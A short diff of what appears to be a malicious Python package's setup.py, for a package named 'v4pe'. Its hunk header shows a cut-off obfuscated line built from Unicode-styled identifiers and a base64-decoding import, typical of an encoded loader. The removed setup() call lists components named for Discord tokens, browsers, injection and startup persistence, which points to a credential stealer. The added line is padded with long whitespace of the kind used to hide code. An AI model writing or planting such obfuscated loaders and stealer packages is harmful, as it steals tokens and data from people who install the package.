@@ -874,16 +874,4 @@ if __𝙣𝘢𝙢𝗲__ == __𝗶𝙢𝙥𝗼𝘳𝘁__('base64').b64decode(__�
 from pathlib import Path
 os.chdir(Path(__file__).parent.absolute())
 
-setup(
-    packages=find_packages(
-        where='src',
-        include=['pkg*'],  # alternatively: `exclude=['additional*']`
-    ),
-    package_dir={"": "src"},
-    # packages = ["components", "components.browsers", "components.discordtoken", "components.injection", "components.startup", "components.systeminfo", "config"],
-    name='v4pe',
-    version='5',
-    description='v4pe',
-    # long_description=read('README.rst'),
-    author='123_Proxy_Dev'
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                   
